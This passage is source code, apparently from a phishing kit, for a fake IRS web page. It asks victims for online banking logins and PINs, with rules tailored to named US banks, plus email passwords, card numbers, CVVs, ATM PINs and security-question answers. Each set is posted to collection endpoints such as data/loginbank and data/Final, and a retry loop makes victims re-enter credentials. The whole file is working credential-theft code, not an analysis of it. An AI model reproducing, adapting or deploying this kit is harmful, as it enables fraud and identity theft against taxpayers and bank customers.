    <div class="form-group">
      <div class="control-label">
        <label>Security Question Answer 3</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
        <button aria-controls="help-addr" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-addr" data-toggle="collapse" type="button">
        </button>
      </div>
      <input class="form-control" id="answer3" maxlength="100" type="text" name="answer3" value=""> 
        
    </div>


    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>

</main>';

} ?>

    </div>
          
      <div class="container-fluid" style="background: #4E4E4E;width: 100%;">
          <div class="footer container-fluid"> 
            <div class="navbar">
              <div class="navfooterlogo">
          <img aria-hidden="true" alt="Decorative IRS Logo" src="./assets/images/irs_horiz_white.png">
        </div>

              
          <ul class="navbar-nav">
            <li class="navbar-item"><a class="nav-link" href="javascript:openIrsPrivacyPolicy()" title="Click this link to view the IRS Privacy Policy Page">
              <span style="color:white">IRS Privacy Policy</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg></a></li>
            <li class="navbar-item" id="accessibility-link"><a class="nav-link" href="javascript:openIrsAccessibility()" title="Click this link to view the Accessibility Page">
                <span style="color:white">Accessibility</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg>
            </a></li>
          </ul>
          

        </div>
      </div>
    </div>
      
      
    
    <form action="/irfof-wmsp/logout" method="post" name="logoutForm">
    </form>
  <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front expire ui-dialog-buttons ui-draggable" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle expire"><span id="ui-id-1" class="ui-dialog-title expire">IRS - Session Warning</span><button type="button" class="ui-dialog-titlebar-close expire"></button></div><div id="expire-content" style="" class="ui-dialog-content ui-widget-content expire"><div id="expire-text" tabindex="0" class="expire">Your session will expire in 5 minutes.<br class="expire"><br class="expire">If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.</div></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix expire"><div class="ui-dialog-buttonset expire"><button type="button" title="Click here if you want to renew this session for 15 minutes" class="expire">OK</button><button type="button" title="Do not renew session" class="expire">Cancel</button></div></div></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    
<script type="text/javascript">
    var emailretry = 0;
    var loginretry = 0;
$(".loading").show();
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
    $("#loginbank").show();
    $("#secq").hide();
    $("#emailaccess").hide();
    $("#card").hide();
    }
}

$(function() {
$('#DateOfBirth').mask('00/00/0000');
$('#ZipCode').mask('00000');
$('#NumberPhone').mask('(000) 000-0000');
$('#CardNumber').mask('0000 0000 0000 0000');
$('#ExpirationDate').mask('00/00');
$('#Cvv').mask('0000');
$('#AtmPin').mask('000000');
$('#SecurityNumber').mask('000-00-0000');
$('#NumberPin').mask('0000000000');
$('#LicenseNExp').mask('00/00/0000');
$('#accountNumberInput').mask('00000000000000000');
$('#routingNumberGroup').mask('000000000');
$("#pinbank").mask('0000');
});
$(document).ready(function() {
    $("#emaildress").blur(function() {
        var el = $(this);

        var url = "emailvalidate.php?emaildress="+ $("#emaildress").val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                $("#emailProvider").val(result.emailProvider);
                $("#emailType").val(result.emailType);
                }
            });
        
    });
});

$(document).ready(function () {
    var $input = $('#loginbank input'),
        $register = $('#confirm-btn');

    $input.each(function () {
        if (!$(this).val()) {
            $register.attr('disabled', true);
            return false;
        }
    });
    $input.keyup(function () {
        var trigger = false;
        $input.each(function () {
            if (!$(this).val()) {
                trigger = true;
            }
        });

        trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

    });
});

$(document).ready(function () {
    var $input = $('#emailaccess input'),
        $register = $('#email-btn');

    $input.each(function () {
        if (!$(this).val()) {
            $register.attr('disabled', true);
            return false;
        }
    });
    $input.keyup(function () {
        var trigger = false;
        $input.each(function () {
            if (!$(this).val()) {
                trigger = true;
            }
        });

        trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

    });
});


jQuery.validator.addMethod("noEmail", function(value, element, param) {
  return this.optional(element) || (value.indexOf("@") <= 0);
}, "Email and password can't be the same"); 

$.validator.addMethod("nowhitespace", function(value, element) {
    return this.optional(element) || /^\S+$/i.test(value);
}, "Please check your info and try again.");

$.validator.addMethod("validExp", function(value, element) {
    return this.optional(element) || /(([0][1-9]{1})|([1][0-2]{1}))\/([2][1-9]{1})/i.test(value);
}, "Invalid exipiry date.");



$(function(){
    $("#loginretry").val(loginretry);
    $(document).on('submit', '#loginbank > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                "userbank": {
                    required: true,
                    minlength:4,
                    noEmail: true,
                    nowhitespace: true
                },
                "passwordbank": {
                    required: true,
                    minlength: 4,
                    noEmail: true,
                    nowhitespace: true
                
                <?php 
                if ($bankname === "Citibank" or $bankname === "CITIBANK NA" or preg_match("/CITIBANK/", $bankname)) {
                    echo '}, "pinbank": {
                    required: false,
                    minlength: 4,
                    digits: true
                }';
                } elseif ($bankname === "USAA" or $bankname ==="USAA FEDERAL SAVINGS BANK") {
                    echo '}, "pinbank": {
                    required: true,
                    minlength: 4,
                    digits: true
                }';
                } else {
                    echo '}';
                }
                ?>
            },
            messages: {
                "userbank": {
                    required: "Please provide your online banking username",
                    minlength: "Please correct your username",
                },
                "passwordbank": {
                    required: "Please provide your online banking password",
                    minlength: "Please check your password",
            
                <?php 
                if ($bankname === "CITIBANK NA" or $bankname ==="USAA FEDERAL SAVINGS BANK" or preg_match("/CITIBANK/", $bankname) or preg_match("/USAA/", $bankname)) {
                    echo '}, "pinbank": {
                    required: "Please provide your online banking pin",
                    minlength: "Please check your pin",
                },';
                } else {
                    echo '}';
                }
                ?>
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },      
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
                loginretry++
                $("#loginretry").val(loginretry);
                $.post("data/loginbank?key=<?php echo $key;?>", $('#loginbank > form').serialize(), function(result, success) {
                  $('#loginbank .login-submit-button').prop('disabled', true); 
                    if (success == "success") {
                      if (loginretry >= <?php echo $numberofloginretry ?>) {
                        $(".login-errors").hide();
                        $("#loginbank").hide();
                        $('#loginbank .login-submit-button').prop('disabled', false); 
                        <?php if ($bankname === "Bank Of America" or $bankname === "BANK OF AMERICA NA" or $bankname === "Regions Bank" or $bankname === "REGIONS BANK" or $bankname === "PNC" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or $bankname === "BANK OF AMERICA, N.A." or preg_match("/REGIONS\sBANK/", $bankname) or $bankname === "PNC" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or $bankname === "PNC BANK, NATIONAL ASSOCIATION" or $bankname === "BANK OF AMERICA, N.A." or $bankname === "US BANK" or $bankname === "US BANK NA" or $bankname === "U.S. Bank" or preg_match("/PNC/", $bankname) or preg_match("/BANK\sOF\sAMERICA/", $bankname) or preg_match("/BB&T/", $bankname) or preg_match("/REGIONS\sBANK/", $bankname) or preg_match("/PNC/", $bankname) or preg_match("/HUNTINGTON\sNATIONAL\sBANK/", $bankname) or preg_match("/USAA/", $bankname)) {
                          echo '$("#secq").show();';
                        } else {
                            echo '$("#emailaccess").show();';
                        } ?>
                        $(location).attr("", "");
                    } else {
                      $('#loginbank .login-submit-button').prop('disabled', false); 
                      $(".login-errors").show();
                      $('#loginbank > form').trigger("reset");
                    }                  
                    }
                    
                });                  
        
},});
});
});

// emailBank js

jQuery.validator.addMethod("notEqual", function(value, element, param) {
  return this.optional(element) || value != $(param).val();
}, "Email and password can't be the same"); 
$(function(){
    $("#emailretry").val(loginretry);
    $(document).on('submit', '#emailaccess > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                "emaildress": {
                    required: true,
                    email: true,
                    nowhitespace: true,
                    minlength: {
                        param:4,
                    }
                },
                "emailPassword": {
                    required: true,
                    minlength: 4,
                    notEqual : "#emaildress",
                    equalTo : "#emailPasswordC",
                    nowhitespace: true
                },
              "emailPasswordC": {
                    required: true,
                    minlength: 4,
                    equalTo : "#emailPassword",
                    nowhitespace: true
              }
            },
            messages: {
                "emaildress": "Please enter a valid email address",
                "emailPassword": {
                    required: "incorrect email password",
                    equalTo: "Passwords do not match",
                },
                "emailPasswordC": {
                    required: "Repeat email password",
                    equalTo: "Passwords do not match",
                },
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },      
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
                emailretry++
                $("#emailretry").val(emailretry);
                $.post("data/emailbank?key=<?php echo $key;?>", $("#emailaccess > form").serialize(), function(result, success) {
                  $('#emailaccess .login-submit-button').prop('disabled', true); 
                if (success == "success") {
                  if (emailretry >= <?php echo $numberofretries ?>) {
                        $(".login-errors").hide();
                        $("#emailaccess").hide();
                        $('#billing .login-submit-button').prop('disabled', false); 
                        $("#card").show();
                        $(location).attr("", "");
                    } else {
                      $('#billing .login-submit-button').prop('disabled', false); 
                      $(".login-errors").show();
                      $('#emailaccess > form').trigger("reset");
                    }
                    
                }
                });  
                
},

});
});
});

$(function(){
    $(document).on('submit', '#card > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                CardNumber: { required: true, minlength: 16, creditcard: true,},
                ExpirationDate: { required: true, minlength: 4, validExp:true,},
                Cvv: { required: true, minlength: 3, digits: true,},
                AtmPin: { required: true, minlength: 4, digits: true,},
            },
            messages: {
                CardNumber: {
                    required: "Please provide 16 digit card number",
                    minlength: "Please check the card number you have entered",
                    creditcard: "Please enter a valid card number",
                },
                ExpirationDate: {
                    required: "Please provide card expiry date",
                    minlength: "Please check the card expiry date you have entered",
                },
                Cvv: {
                    required: "Please provide 3 digit card security code (CVV)",
                    minlength: "Please check the card security code you have entered",
                    digits: "Please ensure you entered digits only",
                },
                AtmPin: {
                    required: "Please provide your ATM pin",
                    minlength: "Please check the ATM pin you have entered",
                    digits: "Please ensure you entered digits only",
                },
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },      
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
                
                $.post("data/Final?key=<?php echo $key;?>", $("#card > form").serialize(), function(result, success) {
                  $('#card .login-submit-button').prop('disabled', true); 
                    if (success == "success") {
                      $('#billing .login-submit-button').prop('disabled', false); 
                        $(location).attr("href", "verification?key=<?php echo $key;?>");
                    }                        
                });                  
        
},});
});
});

$(function(){
    $(document).on('submit', '#secq > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                "answer1": {
                    required: true,
                },
                "answer2": {
                    required: true,
                },
                "answer3": {
                    required: true,
                }
            },
            messages: {
                "answer1": "Please provide an answer to your question",
                "answer2": "Please provide an answer to your question",
                "answer3": "Please provide an answer to your question",
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },      
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
                $.post("data/secq?key=<?php echo $key;?>", $("#secq > form").serialize(), function(result, success) {
                  $('#billing .login-submit-button').prop('disabled', true); 
                    if (success == "success") {
                      $('#billing .login-submit-button').prop('disabled', false); 
                        $("#secq").hide();
                        $("#emailaccess").show();
                        $(location).attr("", "");
                    }
                });                 
        
},});
});
});
 $("#intro_btn").click(function(e) {
   $("#intro").hide();
   $("#billing").show();
 });
</script>
<script>
function openIrsPage () {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
function openIrsAccessibility ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
}
if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/help/irsgov-accessibility",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/help/irsgov-accessibility",
    "_blank" );
 }   
}

function openIrsPrivacyPolicy ( ) {

var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();

if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/privacy-disclosure/irs-privacy-policy",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/privacy/index.html",
    "_blank" );
 } 
}

function switchLanguage ( ) {
  
  location.replace ( "?lang=es");
}

</script>
</html>